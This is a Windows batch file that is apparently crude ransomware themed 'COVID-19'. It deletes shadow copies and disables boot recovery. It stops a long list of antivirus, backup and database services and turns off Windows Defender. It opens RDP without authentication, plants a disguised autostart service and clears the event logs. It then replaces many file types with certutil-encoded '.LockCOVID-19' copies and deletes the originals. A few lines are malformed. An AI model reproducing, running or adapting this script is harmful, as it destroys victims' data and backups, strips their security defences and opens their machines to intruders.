@echo off
SETLOCAL EnableExtensions
ipconfig /renew
title COVID-19
wmic useraccount where name='currentname' rename PAYRANSOM
wmic useraccount where name='administartor' rename PAYRANSOM
vssadmin Delete Shadows /all /quiet
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB
vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB
vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB
vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB
vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB
vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB
vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
vssadmin Delete Shadows /all /quiet
vssadmin.exe Delete Shadows /All /Quiet
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md A:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md B:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md C:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md D:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md E:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md F:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md G:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md H:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md I:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md J:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md K:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md L:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md M:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md N:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md O:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md P:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md Q:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md R:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md S:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md T:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md U:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md V:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md W:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md X:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md Y:\PAYRANSOM!\%E)
FOR %E IN (PAYRANSOM,PAYRANSOM,PAYMONEY,ENCRYPTED,ENCRYPT,PAY,PAYY,PAYYY,PAYYYY,PAYYYYYY,PAYRANSOMM,PAYCASH,PAYMONEY,PAYRANSOMMONEY,PAYIT,PAYITNOW,PAYTHEMONEY,PAYTHEMONEYY,PAYMONEYY,MONEYPAY,RANSOMPAY,CASHPAY,PAYMONEYRANSOMMONEY,PAYMONEYYYYYY,PAYCASHHHHHH,PAYCASHNOW) DO (md Z:\PAYRANSOM!\%E)
net stop SQLAgent$SYSTEM_BGC /y
net stop “Sophos Device Control Service” /y
net stop macmnsvc /y
net stop SQLAgent$ECWDB2 /y
net stop “Zoolz 2 Service” /y
net stop McTaskManager /y
net stop “Sophos AutoUpdate Service” /y
net stop “Sophos System Protection Service” /y
net stop EraserSvc11710 /y
net stop PDVFSService /y
net stop SQLAgent$PROFXENGAGEMENT /y
net stop SAVService /y
net stop MSSQLFDLauncher$TPSAMA /y
net stop EPSecurityService /y
net stop SQLAgent$SOPHOS /y
net stop “Symantec System Recovery” /y
net stop Antivirus /y
net stop SstpSvc /y
net stop MSOLAP$SQL_2008 /y
net stop TrueKeyServiceHelper /y
net stop sacsvr /y
net stop VeeamNFSSvc /y
net stop FA_Scheduler /y
net stop SAVAdminService /y
net stop EPUpdateService /y
net stop VeeamTransportSvc /y
net stop “Sophos Health Service” /y
net stop bedbg /y
net stop MSSQLSERVER /y
net stop KAVFS /y
net stop Smcinst /y
net stop MSSQLServerADHelper100 /y
net stop TmCCSF /y
net stop wbengine /y
net stop SQLWriter /y
net stop MSSQLFDLauncher$TPS /y
net stop SmcService /y
net stop ReportServer$TPSAMA /y
net stop swi_update /y
net stop AcrSch2Svc /y
net stop MSSQL$SYSTEM_BGC /y
net stop VeeamBrokerSvc /y
net stop MSSQLFDLauncher$PROFXENGAGEMENT /y
net stop VeeamDeploymentService /y
net stop SQLAgent$TPS /y
net stop DCAgent /y
net stop “Sophos Message Router” /y
net stop MSSQLFDLauncher$SBSMONITORING /y
net stop wbengine /y
net stop MySQL80 /y
net stop MSOLAP$SYSTEM_BGC /y
net stop ReportServer$TPS /y
net stop MSSQL$ECWDB2 /y
net stop SntpService /y
net stop SQLSERVERAGENT /y
net stop BackupExecManagementService /y
net stop SMTPSvc /y
net stop mfefire /y
net stop BackupExecRPCService /y
net stop MSSQL$VEEAMSQL2008R2 /y
net stop klnagent /y
net stop MSExchangeSA /y
net stop MSSQLServerADHelper /y
net stop SQLTELEMETRY /y
net stop “Sophos Clean Service” /y
net stop swi_update_64 /y
net stop “Sophos Web Control Service” /y
net stop EhttpSrv /y
net stop POP3Svc /y
net stop MSOLAP$TPSAMA /y
net stop McAfeeEngineService /y
net stop “Veeam Backup Catalog Data Service” /
net stop MSSQL$SBSMONITORING /y
net stop ReportServer$SYSTEM_BGC /y
net stop AcronisAgent /y
net stop KAVFSGT /y
net stop BackupExecDeviceMediaService /y
net stop MySQL57 /y
net stop McAfeeFrameworkMcAfeeFramework /y
net stop TrueKey /y
net stop VeeamMountSvc /y
net stop MsDtsServer110 /y
net stop SQLAgent$BKUPEXEC /y
net stop UI0Detect /y
net stop ReportServer /y
net stop SQLTELEMETRY$ECWDB2 /y
net stop MSSQLFDLauncher$SYSTEM_BGC /y
net stop MSSQL$BKUPEXEC /y
net stop SQLAgent$PRACTTICEBGC /y
net stop MSExchangeSRS /y
net stop SQLAgent$VEEAMSQL2008R2 /y
net stop McShield /y
net stop SepMasterService /y
net stop “Sophos MCS Client” /y
net stop VeeamCatalogSvc /y
net stop SQLAgent$SHAREPOINT /y
net stop NetMsmqActivator /y
net stop kavfsslp /y
net stop tmlisten /y
net stop ShMonitor /y
net stop MsDtsServer /y
net stop SQLAgent$SQL_2008 /y
net stop SDRSVC /y
net stop IISAdmin /y
net stop SQLAgent$PRACTTICEMGT /y
net stop BackupExecJobEngine /y
net stop SQLAgent$VEEAMSQL2008R2 /y
net stop BackupExecAgentBrowser /y
net stop VeeamHvIntegrationSvc /y
net stop masvc /y
net stop W3Svc /y
net stop “SQLsafe Backup Service” /y
net stop SQLAgent$CXDB /y
net stop SQLBrowser /y
net stop MSSQLFDLauncher$SQL_2008 /y
net stop VeeamBackupSvc /y
net stop “Sophos Safestore Service” /y
net stop svcGenericHost /y
net stop ntrtscan /y
net stop SQLAgent$VEEAMSQL2012 /y
net stop MSExchangeMGMT /y
net stop SamSs /y
net stop MSExchangeES /y
net stop MBAMService /y
net stop EsgShKernel /y
net stop ESHASRV /y
net stop MSSQL$TPSAMA /y
net stop SQLAgent$CITRIX_METAFRAME /y
net stop VeeamCloudSvc /y
net stop “Sophos File Scanner Service” /y
net stop “Sophos Agent” /y
net stop MBEndpointAgent /y
net stop swi_service /y
net stop MSSQL$PRACTICEMGT /y
net stop SQLAgent$TPSAMA /y
net stop McAfeeFramework /y
net stop “Enterprise Client Service” /y
net stop SQLAgent$SBSMONITORING /y
net stop MSSQL$VEEAMSQL2012 /y
net stop swi_filter /y
net stop SQLSafeOLRService /y
net stop BackupExecVSSProvider /y
net stop VeeamEnterpriseManagerSvc /y
net stop SQLAgent$SQLEXPRESS /y
net stop OracleClientCache80 /y
net stop MSSQL$PROFXENGAGEMENT /y
net stop IMAP4Svc /y
net stop ARSM /y
net stop MSExchangeIS /y
net stop AVP /y
net stop MSSQLFDLauncher /y
net stop MSExchangeMTA /y
net stop TrueKeyScheduler /y
net stop MSSQL$SOPHOS /y
net stop “SQL Backups” /y
net stop MSSQL$TPS /y
net stop mfemms /y
net stop MsDtsServer100 /y
net stop MSSQL$SHAREPOINT /y
net stop WRSVC /y
net stop mfevtp /y
net stop msftesql$PROD /y
net stop mozyprobackup /y
net stop MSSQL$SQL_2008 /y
net stop SNAC /y
net stop ReportServer$SQL_2008 /y
net stop BackupExecAgentAccelerator /y
net stop MSSQL$SQLEXPRESS /y
net stop MSSQL$PRACTTICEBGC /y
net stop VeeamRESTSvc /y
net stop sophossps /y
net stop ekrn /y
net stop MMS /y
net stop “Sophos MCS Agent” /y
net stop RESvc /y
net stop “Acronis VSS Provider” /y
net stop MSSQL$VEEAMSQL2008R2 /y
net stop MSSQLFDLauncher$SHAREPOINT /y
net stop “SQLsafe Filter Service” /y
net stop MSSQL$PROD /y
net stop SQLAgent$PROD /y
net stop MSOLAP$TPS /y
net stop VeeamDeploySvc /y
net stop MSSQLServerOLAPService /y
del %0
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"
reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "UserAuthentication" /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\System
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Current Version\Run" /v R00 /t REG_SZ /d "1" /f 
netsh advfirewall firewall add rule name="allow RemoteDesktop" dir=in protocol=TCP localport=3389 action=allow
netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
sc Create utxNEventLogx binpath= "C:\Windows\safe.exe" DisplayName= "Stores and retrieves events that can be viewed in the event viewer. Part of services.exe ytcFX pjvNVRx" start=auto
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
cd %userprofile%\documents\
attrib Default.rdp -s -h
del Default.rdp
for /F "token=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
start mshta vbscript:createobject/"wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
:begin
REM
cd %SystemDrive%\
for %%a in (*.sql) do certutil -encode "%%~a" "%%~na.sql.LockCOVID-19"
del /s /f /q *.sql
for %%a in (*.mp4) do certutil -encode "%%~a" "%%~na.mp4.LockCOVID-19"
del /s /f /q *.mp4
for %%a in (*.7z) do certutil -encode "%%~a" "%%~na.7z.LockCOVID-19"
del /s /f /q *.7z
for %%a in (*.rar) do certutil -encode "%%~a" "%%~na.rar.LockCOVID-19"
del /s /f /q *.rar
for %%a in (*.m4a) do certutil -encode "%%~a" "%%~na.m4a.LockCOVID-19"
del /s /f /q *.m4a
for %%a in (*.wma) do certutil -encode "%%~a" "%%~na.wma.LockCOVID-19"
del /s /f /q *.wma
for %%a in (*.avi) do certutil -encode "%%~a" "%%~na.avi.LockCOVID-19"
del /s /f /q *.avi
for %%a in (*.wmv) do certutil -encode "%%~a" "%%~na.wmv.LockCOVID-19"
del /s /f /q *.wmv
for %%a in (*.csv) do certutil -encode "%%~a" "%%~na.csv.LockCOVID-19"
del /s /f /q *.csv
for %%a in (*.d3dbsp) do certutil -encode "%%~a" "%%~na.d3dbsp.LockCOVID-19"
del /s /f /q *.d3dbsp
for %%a in (*.zip) do certutil -encode "%%~a" "%%~na.zip.LockCOVID-19"
del /s /f /q *.zip
for %%a in (*.sie) do certutil -encode "%%~a" "%%~na.sie.LockCOVID-19"
del /s /f /q *.sie
for %%a in (.sum) do certutil -encode "%%~a" "%%~na.sum.LockCOVID-19"
del /s /f /q *.sum
for %%a in (*.ibank) do certutil -encode "%%~a" "%%~na.ibank.LockCOVID-19"
del /s /f /q *.ibank
for %%a in (*.t13) do certutil -encode "%%~a" "%%~na.t13.LockCOVID-19"
del /s /f /q *.t13
for %%a in (*.t12) do certutil -encode "%%~a" "%%~na.t12.LockCOVID-19"
del /s /f /q *.t12
for %%a in (*.qdf) do certutil -encode "%%~a" "%%~na.qdf.LockCOVID-19"
del /s /f /q *.qdf
for %%a in (*.gdb) do certutil -encode "%%~a" "%%~na.gdb.LockCOVID-19"
del /s /f /q *.gdb
for %%a in (*.tax) do certutil -encode "%%~a" "%%~na.tax.LockCOVID-19"
del /s /f /q *.tax
for %%a in (*.pkpass) do certutil -encode "%%~a" "%%~na.pkpass.LockCOVID-19"
del /s /f /q *.pkpass
for %%a in (*.bc6) do certutil -encode "%%~a" "%%~na.bc6.LockCOVID-19"
del /s /f /q *.bc6
for %%a in (*.bc7) do certutil -encode "%%~a" "%%~na.bc7.LockCOVID-19"
del /s /f /q *.bc7
for %%a in (*.bkp) do certutil -encode "%%~a" "%%~na.bkp.LockCOVID-19"
del /s /f /q *.bkp
for %%a in (*.qic) do certutil -encode "%%~a" "%%~na.qic.LockCOVID-19"
del /s /f /q *.qic
for %%a in (*.bkf) do certutil -encode "%%~a" "%%~na.bkf.LockCOVID-19"
del /s /f /q *.bkf
for %%a in (*.sidn) do certutil -encode "%%~a" "%%~na.sidn.LockCOVID-19"
del /s /f /q *.sidn
for %%a in (*.sidd) do certutil -encode "%%~a" "%%~na.sidd.LockCOVID-19"
del /s /f /q *.sidd
for %%a in (*.mddata) do certutil -encode "%%~a" "%%~na.mddata.LockCOVID-19"
del /s /f /q *.mddata
for %%a in (*.itl) do certutil -encode "%%~a" "%%~na.itl.LockCOVID-19"
del /s /f /q *.itl
for %%a in (*.itdb) do certutil -encode "%%~a" "%%~na.itdb.LockCOVID-19"
del /s /f /q *.itdb
for %%a in (*.icxs) do certutil -encode "%%~a" "%%~na.icxs.LockCOVID-19"
del /s /f /q *.icxs
for %%a in (*.hvpl) do certutil -encode "%%~a" "%%~na.hvpl.LockCOVID-19"
del /s /f /q *.hvpl
for %%a in (*.hplg) do certutil -encode "%%~a" "%%~na.hplg.LockCOVID-19"
del /s /f /q *.hplg
for %%a in (*.hkdb) do certutil -encode "%%~a" "%%~na.hkdb.LockCOVID-19"
del /s /f /q *.hkdb
for %%a in (*.mdbackup) do certutil -encode "%%~a" "%%~na.mdbackup.LockCOVID-19"
del /s /f /q *.mdbackup
for %%a in (*.syncdb) do certutil -encode "%%~a" "%%~na.syncdb.LockCOVID-19"
del /s /f /q *.syncdb
for %%a in (*.gho) do certutil -encode "%%~a" "%%~na.gho.LockCOVID-19"
del /s /f /q *.gho
for %%a in (*.cas) do certutil -encode "%%~a" "%%~na.cas.LockCOVID-19"
del /s /f /q *.cas
for %%a in (*.svg) do certutil -encode "%%~a" "%%~na.svg.LockCOVID-19"
del /s /f /q *.svg
for %%a in (*.map) do certutil -encode "%%~a" "%%~na.map.LockCOVID-19"
del /s /f /q *.map
for %%a in (*.wmo) do certutil -encode "%%~a" "%%~na.wmo.LockCOVID-19"
del /s /f /q *.wmo
for %%a in (*.itm) do certutil -encode "%%~a" "%%~na.itm.LockCOVID-19"
del /s /f /q *.itm
for %%a in (*.sb) do certutil -encode "%%~a" "%%~na.sb.LockCOVID-19"
del /s /f /q *.sb
for %%a in (*.fos) do certutil -encode "%%~a" "%%~na.fos.LockCOVID-19"
del /s /f /q *.fos
for %%a in (*.mov) do certutil -encode "%%~a" "%%~na.mov.LockCOVID-19"
del /s /f /q *.mov
for %%a in (*.vdf) do certutil -encode "%%~a" "%%~na.vdf.LockCOVID-19"
del /s /f /q *.vdf
for %%a in (*.ztmp) do certutil -encode "%%~a" "%%~na.ztmp.LockCOVID-19"
del /s /f /q *.ztmp
for %%a in (*.sis) do certutil -encode "%%~a" "%%~na.sis.LockCOVID-19"
del /s /f /q *.sis
for %%a in (*.sid) do certutil -encode "%%~a" "%%~na.sid.LockCOVID-19"
del /s /f /q *.sid
for %%a in (*.ncf) do certutil -encode "%%~a" "%%~na.ncf.LockCOVID-19"
del /s /f /q *.ncf
for %%a in (*.menu) do certutil -encode "%%~a" "%%~na.menu.LockCOVID-19"
del /s /f /q *.menu
for %%a in (*.layout) do certutil -encode "%%~a" "%%~na.layout.LockCOVID-19"
del /s /f /q *.layout
for %%a in (*.dmp) do certutil -encode "%%~a" "%%~na.dmp.LockCOVID-19"
del /s /f /q *.dmp
for %%a in (*.blob) do certutil -encode "%%~a" "%%~na.blob.LockCOVID-19"
del /s /f /q *.blob
for %%a in (*.esm) do certutil -encode "%%~a" "%%~na.esm.LockCOVID-19"
del /s /f /q *.esm
for %%a in (*.vcf) do certutil -encode "%%~a" "%%~na.vcf.LockCOVID-19"
del /s /f /q *.vcf
for %%a in (*.vtf) do certutil -encode "%%~a" "%%~na.vtf.LockCOVID-19"
del /s /f /q *.vtf
for %%a in (*.dazip) do certutil -encode "%%~a" "%%~na.dazip.LockCOVID-19"
del /s /f /q *.dazip
for %%a in (*.fpk) do certutil -encode "%%~a" "%%~na.fpk.LockCOVID-19"
del /s /f /q *.fpk
for %%a in (*.mlx) do certutil -encode "%%~a" "%%~na.mlx.LockCOVID-19"
del /s /f /q *.mlx
for %%a in (*.kf) do certutil -encode "%%~a" "%%~na.kf.LockCOVID-19"
del /s /f /q *.kf
for %%a in (*.iwd) do certutil -encode "%%~a" "%%~na.iwd.LockCOVID-19"
del /s /f /q *.iwd
for %%a in (*.vpk) do certutil -encode "%%~a" "%%~na.vpk.LockCOVID-19"
del /s /f /q *.vpk
for %%a in (*.tor) do certutil -encode "%%~a" "%%~na.tor.LockCOVID-19"
del /s /f /q *.tor
for %%a in (*.psk) do certutil -encode "%%~a" "%%~na.psk.LockCOVID-19"
del /s /f /q *.psk
for %%a in (*.rim) do certutil -encode "%%~a" "%%~na.rim.LockCOVID-19"
del /s /f /q *.rim
